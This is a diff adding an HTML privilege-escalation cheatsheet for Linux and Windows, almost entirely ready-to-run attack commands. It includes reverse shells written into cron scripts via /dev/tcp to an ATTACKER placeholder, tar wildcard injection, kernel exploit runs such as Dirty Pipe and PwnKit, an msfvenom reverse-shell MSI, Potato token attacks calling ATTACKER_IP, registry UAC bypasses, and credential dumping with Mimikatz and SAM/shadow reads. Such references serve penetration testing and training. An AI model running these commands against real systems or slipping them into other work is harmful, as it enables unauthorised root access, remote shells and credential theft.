@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privilege Escalation Cheatsheet | maeitsec</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg-primary:#0a0a0f;--bg-secondary:#12121a;--bg-tertiary:#1a1a24;--accent:#00ff88;--accent-dim:#00cc6a;--accent-glow:rgba(0,255,136,0.15);--text-primary:#e4e4e7;--text-secondary:#a1a1aa;--text-muted:#71717a;--border:#27272a;--red:#ff4757;--yellow:#ffa502;--blue:#3b82f6;--purple:#a855f7;--orange:#f97316}*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.6}nav{position:fixed;top:0;width:100%;padding:1rem 2rem;background:rgba(10,10,15,0.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);z-index:1000;display:flex;justify-content:space-between;align-items:center}.logo{font-family:'JetBrains Mono',monospace;font-size:1.25rem;font-weight:700;color:var(--accent);text-decoration:none}.logo span{color:var(--text-primary)}.back-link{color:var(--text-secondary);text-decoration:none;font-size:0.9rem}.back-link:hover{color:var(--accent)}.container{max-width:1400px;margin:0 auto;padding:5rem 2rem 3rem;display:grid;grid-template-columns:250px 1fr;gap:3rem}.sidebar{position:sticky;top:5rem;height:fit-content}.sidebar-title{font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);margin-bottom:1rem}.sidebar-nav{list-style:none}.sidebar-nav li{margin-bottom:0.25rem}.sidebar-nav a{display:block;padding:0.5rem 1rem;color:var(--text-secondary);text-decoration:none;font-size:0.9rem;border-left:2px solid transparent}.sidebar-nav a:hover{color:var(--accent);border-left-color:var(--accent);background:var(--accent-glow)}.content{min-width:0}.page-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}.page-header h1{font-size:2.5rem;margin-bottom:0.5rem}.page-header p{color:var(--text-secondary);font-size:1.1rem}.section{margin-bottom:3rem;scroll-margin-top:5rem}.section-title{display:flex;align-items:center;gap:0.75rem;font-size:1.5rem;margin-bottom:1.5rem;color:var(--accent)}.section-title::after{content:'';flex:1;height:1px;background:var(--border)}.code-block{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;margin-bottom:1.5rem;overflow:hidden}.code-header{display:flex;justify-content:space-between;align-items:center;padding:0.75rem 1rem;background:var(--bg-tertiary);border-bottom:1px solid var(--border)}.code-title{font-size:0.85rem;color:var(--text-secondary);font-weight:500}.code-tag{font-size:0.7rem;padding:0.2rem 0.5rem;border-radius:4px;font-family:'JetBrains Mono',monospace}.tag-linux{background:rgba(0,255,136,0.2);color:var(--accent)}.tag-windows{background:rgba(59,130,246,0.2);color:var(--blue)}.tag-both{background:rgba(168,85,247,0.2);color:var(--purple)}.code-content{padding:1rem;overflow-x:auto}.code-content pre{font-family:'JetBrains Mono',monospace;font-size:0.85rem;line-height:1.6;color:var(--text-primary);white-space:pre-wrap;word-break:break-all}.code-content .comment{color:var(--text-muted)}.copy-btn{background:var(--bg-tertiary);border:1px solid var(--border);color:var(--text-secondary);padding:0.3rem 0.6rem;border-radius:4px;font-size:0.75rem;cursor:pointer}.copy-btn:hover{background:var(--accent);color:var(--bg-primary)}footer{text-align:center;padding:2rem;border-top:1px solid var(--border);color:var(--text-muted);font-size:0.85rem}@media(max-width:900px){.container{grid-template-columns:1fr;padding-top:4rem}.sidebar{display:none}}
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="../index.html" class="logo">&lt;<span>maeitsec</span>/&gt;</a>
+        <a href="../index.html#cheatsheets" class="back-link">← Back to Cheatsheets</a>
+    </nav>
+
+    <div class="container">
+        <aside class="sidebar">
+            <div class="sidebar-title">On This Page</div>
+            <ul class="sidebar-nav">
+                <li><a href="#linux-enum">Linux Enumeration</a></li>
+                <li><a href="#linux-suid">Linux SUID/SGID</a></li>
+                <li><a href="#linux-sudo">Linux Sudo</a></li>
+                <li><a href="#linux-cron">Linux Cron Jobs</a></li>
+                <li><a href="#linux-kernel">Linux Kernel</a></li>
+                <li><a href="#linux-misc">Linux Misc</a></li>
+                <li><a href="#win-enum">Windows Enumeration</a></li>
+                <li><a href="#win-services">Windows Services</a></li>
+                <li><a href="#win-registry">Windows Registry</a></li>
+                <li><a href="#win-tokens">Windows Tokens</a></li>
+                <li><a href="#win-uac">Windows UAC Bypass</a></li>
+                <li><a href="#win-creds">Windows Credentials</a></li>
+                <li><a href="#tools">Tools</a></li>
+            </ul>
+        </aside>
+
+        <main class="content">
+            <header class="page-header">
+                <h1>⬆️ Privilege Escalation</h1>
+                <p>Comprehensive cheatsheet for Linux and Windows privilege escalation techniques.</p>
+            </header>
+
+            <!-- LINUX SECTION -->
+            <section id="linux-enum" class="section">
+                <h2 class="section-title">🐧 Linux Enumeration</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Automated Enumeration</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># LinPEAS - Most comprehensive</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+./linpeas.sh -a 2>&1 | tee linpeas.txt
+
+<span class="comment"># LinEnum</span>
+./LinEnum.sh -t
+
+<span class="comment"># linux-exploit-suggester</span>
+./linux-exploit-suggester.sh
+
+<span class="comment"># pspy - Monitor processes without root</span>
+./pspy64</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Manual Enumeration</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># System info</span>
+uname -a
+cat /etc/*release
+cat /proc/version
+hostname
+
+<span class="comment"># Current user</span>
+id
+whoami
+groups
+
+<span class="comment"># Users</span>
+cat /etc/passwd
+cat /etc/shadow  <span class="comment"># If readable</span>
+cat /etc/group
+
+<span class="comment"># Network</span>
+ifconfig / ip a
+netstat -antup / ss -antup
+cat /etc/hosts
+cat /etc/resolv.conf
+
+<span class="comment"># Running processes</span>
+ps aux
+ps aux | grep root
+
+<span class="comment"># Installed software</span>
+dpkg -l  <span class="comment"># Debian</span>
+rpm -qa  <span class="comment"># RedHat</span>
+
+<span class="comment"># Find writable files/directories</span>
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+<span class="comment"># Find sensitive files</span>
+find / -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null
+find / -name id_rsa 2>/dev/null
+find / -name authorized_keys 2>/dev/null</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="linux-suid" class="section">
+                <h2 class="section-title">🔐 Linux SUID/SGID</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">SUID/SGID Exploitation</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Find SUID binaries</span>
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+<span class="comment"># Find SGID binaries</span>
+find / -perm -2000 -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+
+<span class="comment"># Check GTFOBins for exploitation</span>
+<span class="comment"># https://gtfobins.github.io/</span>
+
+<span class="comment"># Common SUID exploits:</span>
+
+<span class="comment"># /usr/bin/find</span>
+find . -exec /bin/sh -p \; -quit
+
+<span class="comment"># /usr/bin/vim</span>
+vim -c ':!/bin/sh'
+
+<span class="comment"># /usr/bin/nmap (old versions)</span>
+nmap --interactive
+!sh
+
+<span class="comment"># /usr/bin/python</span>
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+<span class="comment"># /usr/bin/bash</span>
+bash -p
+
+<span class="comment"># /usr/bin/less</span>
+less /etc/passwd
+!/bin/sh
+
+<span class="comment"># /usr/bin/cp - Read files</span>
+cp /etc/shadow /tmp/shadow
+
+<span class="comment"># Custom SUID binary - Check for:</span>
+<span class="comment"># - Relative path execution</span>
+<span class="comment"># - Library injection</span>
+<span class="comment"># - Environment variables</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="linux-sudo" class="section">
+                <h2 class="section-title">⚡ Linux Sudo</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Sudo Exploitation</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Check sudo permissions</span>
+sudo -l
+
+<span class="comment"># GTFOBins sudo entries</span>
+
+<span class="comment"># sudo vim</span>
+sudo vim -c ':!/bin/bash'
+
+<span class="comment"># sudo find</span>
+sudo find /etc -exec /bin/bash \;
+
+<span class="comment"># sudo awk</span>
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+<span class="comment"># sudo python</span>
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+
+<span class="comment"># sudo less/more</span>
+sudo less /etc/passwd
+!/bin/bash
+
+<span class="comment"># sudo tar</span>
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+<span class="comment"># sudo zip</span>
+sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+
+<span class="comment"># sudo env</span>
+sudo env /bin/bash
+
+<span class="comment"># sudo ALL, !root (bypass)</span>
+sudo -u#-1 /bin/bash  <span class="comment"># CVE-2019-14287</span>
+
+<span class="comment"># LD_PRELOAD exploitation</span>
+<span class="comment"># If env_keep+=LD_PRELOAD in sudo -l:</span>
+<span class="comment"># Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles</span>
+sudo LD_PRELOAD=/tmp/pe.so /usr/bin/allowed_program</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="linux-cron" class="section">
+                <h2 class="section-title">⏰ Linux Cron Jobs</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Cron Exploitation</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># View cron jobs</span>
+cat /etc/crontab
+cat /etc/cron.d/*
+cat /var/spool/cron/crontabs/*
+ls -la /etc/cron.*
+
+<span class="comment"># Watch for running cron with pspy</span>
+./pspy64
+
+<span class="comment"># Writable cron script</span>
+<span class="comment"># If script is writable, add reverse shell:</span>
+echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /path/to/script.sh
+
+<span class="comment"># Path hijacking (if cron uses relative paths)</span>
+<span class="comment"># Crontab: * * * * * root script.sh</span>
+<span class="comment"># Create malicious script in writable PATH directory</span>
+echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /tmp/script.sh
+chmod +x /tmp/script.sh
+
+<span class="comment"># Wildcard injection (tar)</span>
+<span class="comment"># If cron runs: tar czf backup.tar.gz *</span>
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > shell.sh</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="linux-kernel" class="section">
+                <h2 class="section-title">🔧 Linux Kernel Exploits</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Kernel Exploitation</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Get kernel version</span>
+uname -r
+cat /proc/version
+
+<span class="comment"># Search for exploits</span>
+searchsploit linux kernel 4.4
+
+<span class="comment"># linux-exploit-suggester</span>
+./linux-exploit-suggester.sh
+./linux-exploit-suggester-2.pl
+
+<span class="comment"># Notable kernel exploits:</span>
+
+<span class="comment"># Dirty COW (CVE-2016-5195) - Linux < 4.8.3</span>
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty password
+
+<span class="comment"># Dirty Pipe (CVE-2022-0847) - Linux 5.8 - 5.16.11</span>
+gcc exploit.c -o exploit
+./exploit /etc/passwd 1 $'user:$1$hash:0:0::/root:/bin/bash\n'
+
+<span class="comment"># PwnKit (CVE-2021-4034) - Polkit</span>
+./PwnKit
+
+<span class="comment"># Baron Samedit (CVE-2021-3156) - Sudo < 1.9.5p2</span>
+./exploit
+
+<span class="comment"># Compile on target or similar system</span>
+gcc exploit.c -o exploit
+gcc -m32 exploit.c -o exploit  <span class="comment"># 32-bit</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="linux-misc" class="section">
+                <h2 class="section-title">🔍 Linux Miscellaneous</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Other Linux Techniques</span>
+                        <span class="code-tag tag-linux">Linux</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Capabilities</span>
+getcap -r / 2>/dev/null
+
+<span class="comment"># cap_setuid - Python</span>
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+<span class="comment"># NFS no_root_squash</span>
+showmount -e TARGET
+mount -t nfs TARGET:/share /mnt
+<span class="comment"># Create SUID binary on attacker, copy to mount</span>
+
+<span class="comment"># Docker group</span>
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+<span class="comment"># LXD/LXC group</span>
+lxc image import ./alpine.tar.gz --alias myimage
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+
+<span class="comment"># Password in files</span>
+grep -r "password" /home /var/www /opt 2>/dev/null
+cat ~/.bash_history
+cat /var/log/auth.log | grep -i pass
+
+<span class="comment"># SSH keys</span>
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+<span class="comment"># Add your key to authorized_keys if writable</span>
+
+<span class="comment"># Weak file permissions</span>
+cat /etc/shadow  <span class="comment"># Crack hashes</span>
+ls -la /etc/passwd  <span class="comment"># If writable, add user</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- WINDOWS SECTION -->
+            <section id="win-enum" class="section">
+                <h2 class="section-title">🪟 Windows Enumeration</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Automated Enumeration</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># WinPEAS</span>
+.\winPEASany.exe
+.\winPEASx64.exe quiet fast searchfast
+
+<span class="comment"># PowerUp</span>
+. .\PowerUp.ps1
+Invoke-AllChecks
+
+<span class="comment"># Seatbelt</span>
+.\Seatbelt.exe -group=all
+
+<span class="comment"># SharpUp</span>
+.\SharpUp.exe
+
+<span class="comment"># PrivescCheck</span>
+. .\PrivescCheck.ps1
+Invoke-PrivescCheck</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Manual Enumeration</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># System info</span>
+systeminfo
+hostname
+whoami /all
+net user
+net localgroup administrators
+
+<span class="comment"># Network</span>
+ipconfig /all
+netstat -ano
+arp -a
+route print
+
+<span class="comment"># Running processes</span>
+tasklist /svc
+wmic process list brief
+
+<span class="comment"># Installed software</span>
+wmic product get name,version
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
+
+<span class="comment"># Scheduled tasks</span>
+schtasks /query /fo LIST /v
+
+<span class="comment"># Services</span>
+sc query
+wmic service list brief
+Get-Service
+
+<span class="comment"># Find sensitive files</span>
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="win-services" class="section">
+                <h2 class="section-title">⚙️ Windows Services</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Service Exploitation</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Unquoted service path</span>
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+<span class="comment"># Path: C:\Program Files\My App\service.exe</span>
+<span class="comment"># Place: C:\Program.exe or C:\Program Files\My.exe</span>
+
+<span class="comment"># Weak service permissions</span>
+<span class="comment"># Check with accesschk (Sysinternals)</span>
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Everyone" *
+
+<span class="comment"># Modify service binary path</span>
+sc config vuln_service binpath= "C:\temp\shell.exe"
+sc stop vuln_service
+sc start vuln_service
+
+<span class="comment"># Weak service binary permissions</span>
+accesschk.exe /accepteula -quvw "C:\Program Files\Service\service.exe"
+<span class="comment"># If writable, replace with malicious binary</span>
+
+<span class="comment"># DLL Hijacking in services</span>
+<span class="comment"># Use procmon to find missing DLLs</span>
+<span class="comment"># Place malicious DLL in search path</span>
+
+<span class="comment"># PowerUp automatic exploitation</span>
+Invoke-ServiceAbuse -Name 'vuln_service' -UserName 'attacker' -Password 'password'</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="win-registry" class="section">
+                <h2 class="section-title">🗝️ Windows Registry</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Registry Exploitation</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># AutoRuns - Persistence & Privesc</span>
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+<span class="comment"># Check for writable autorun locations</span>
+accesschk.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+<span class="comment"># AlwaysInstallElevated (install MSI as SYSTEM)</span>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="comment"># If both = 1, create malicious MSI:</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
+msiexec /quiet /qn /i shell.msi
+
+<span class="comment"># Saved credentials</span>
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+
+<span class="comment"># VNC passwords</span>
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server" /v Password
+
+<span class="comment"># Putty sessions</span>
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="win-tokens" class="section">
+                <h2 class="section-title">🎭 Windows Tokens</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Token Manipulation</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Check current privileges</span>
+whoami /priv
+
+<span class="comment"># SeImpersonatePrivilege / SeAssignPrimaryToken</span>
+<span class="comment"># Potato attacks</span>
+
+<span class="comment"># JuicyPotato (Windows 10 < 1809, Server 2019)</span>
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\shell.exe" -t *
+
+<span class="comment"># PrintSpoofer (Windows 10, Server 2016/2019)</span>
+PrintSpoofer.exe -i -c cmd
+
+<span class="comment"># RoguePotato</span>
+RoguePotato.exe -r ATTACKER_IP -e "c:\temp\shell.exe" -l 9999
+
+<span class="comment"># GodPotato (Latest)</span>
+GodPotato.exe -cmd "cmd /c whoami"
+
+<span class="comment"># SweetPotato</span>
+SweetPotato.exe -p c:\temp\shell.exe
+
+<span class="comment"># SeBackupPrivilege</span>
+<span class="comment"># Can read any file - copy SAM/SYSTEM</span>
+robocopy /b c:\windows\system32\config c:\temp sam system
+
+<span class="comment"># SeRestorePrivilege</span>
+<span class="comment"># Can write to any file</span>
+
+<span class="comment"># SeTakeOwnershipPrivilege</span>
+<span class="comment"># Can take ownership of files</span>
+takeown /f C:\Windows\System32\config\SAM
+icacls C:\Windows\System32\config\SAM /grant user:F</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="win-uac" class="section">
+                <h2 class="section-title">🛡️ Windows UAC Bypass</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">UAC Bypass Techniques</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Check UAC level</span>
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+
+<span class="comment"># UACME - Collection of UAC bypasses</span>
+Akagi64.exe 61 c:\temp\shell.exe
+
+<span class="comment"># Fodhelper bypass (Windows 10)</span>
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "c:\temp\shell.exe" /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
+fodhelper.exe
+
+<span class="comment"># Eventvwr bypass</span>
+reg add HKCU\Software\Classes\mscfile\shell\open\command /d "c:\temp\shell.exe" /f
+eventvwr.exe
+
+<span class="comment"># ComputerDefaults bypass</span>
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "c:\temp\shell.exe" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
+computerdefaults.exe
+
+<span class="comment"># Metasploit UAC modules</span>
+use exploit/windows/local/bypassuac
+use exploit/windows/local/bypassuac_fodhelper</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="win-creds" class="section">
+                <h2 class="section-title">🔑 Windows Credentials</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Credential Hunting</span>
+                        <span class="code-tag tag-windows">Windows</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Saved credentials</span>
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+
+<span class="comment"># Credential Manager</span>
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials"
+
+<span class="comment"># SAM and SYSTEM (requires admin)</span>
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+<span class="comment"># Offline: secretsdump.py -sam sam.hive -system system.hive LOCAL</span>
+
+<span class="comment"># Mimikatz</span>
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+
+<span class="comment"># WiFi passwords</span>
+netsh wlan show profiles
+netsh wlan show profile name="SSID" key=clear
+
+<span class="comment"># Browser credentials</span>
+<span class="comment"># LaZagne, SharpWeb, etc.</span>
+
+<span class="comment"># IIS config</span>
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+type C:\inetpub\wwwroot\web.config
+
+<span class="comment"># Unattend files</span>
+type C:\Windows\Panther\Unattend.xml
+type C:\Windows\Panther\Unattended.xml
+type C:\Windows\system32\sysprep\sysprep.xml</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tools" class="section">
+                <h2 class="section-title">🛠️ Tools Reference</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Essential Tools</span>
+                        <span class="code-tag tag-both">Both</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Linux</span>
+LinPEAS:    https://github.com/carlospolop/PEASS-ng
+LinEnum:    https://github.com/rebootuser/LinEnum
+pspy:       https://github.com/DominicBreuker/pspy
+linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
+
+<span class="comment"># Windows</span>
+WinPEAS:    https://github.com/carlospolop/PEASS-ng
+PowerUp:    https://github.com/PowerShellMafia/PowerSploit
+Seatbelt:   https://github.com/GhostPack/Seatbelt
+SharpUp:    https://github.com/GhostPack/SharpUp
+PrivescCheck: https://github.com/itm4n/PrivescCheck
+
+<span class="comment"># Potato attacks</span>
+JuicyPotato: https://github.com/ohpe/juicy-potato
+PrintSpoofer: https://github.com/itm4n/PrintSpoofer
+GodPotato:  https://github.com/BeichenDream/GodPotato
+
+<span class="comment"># UAC Bypass</span>
+UACME:      https://github.com/hfiref0x/UACME
+
+<span class="comment"># GTFOBins (Linux) & LOLBAS (Windows)</span>
+https://gtfobins.github.io/
+https://lolbas-project.github.io/</pre>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <p>&lt;maeitsec/&gt; | Privilege Escalation Cheatsheet</p>
+    </footer>
+
+    <script>
+        function copyCode(btn){const block=btn.closest('.code-block');const code=block.querySelector('pre').textContent;navigator.clipboard.writeText(code);btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',2000);}
+    </script>
+</body>
+</html>
